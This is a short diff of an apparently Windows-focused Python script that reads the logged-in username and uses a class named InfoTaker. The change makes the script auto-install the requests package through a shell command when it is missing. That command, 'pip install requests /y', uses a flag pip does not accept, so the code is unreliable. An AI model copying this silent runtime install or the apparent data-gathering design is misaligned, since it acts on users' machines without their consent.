@@ -2,8 +2,13 @@ import os
 import socket
 import ctypes
 import winreg
-import requests
 import subprocess
+
+try:
+    import requests
+except ModuleNotFoundError as e:
+    print(f"Error: {e}. Module not installed, installing")
+    InfoTaker.executeCommand("pip install requests /y")
 
 # Get the current username of the logged-in user
 username = os.getlogin()
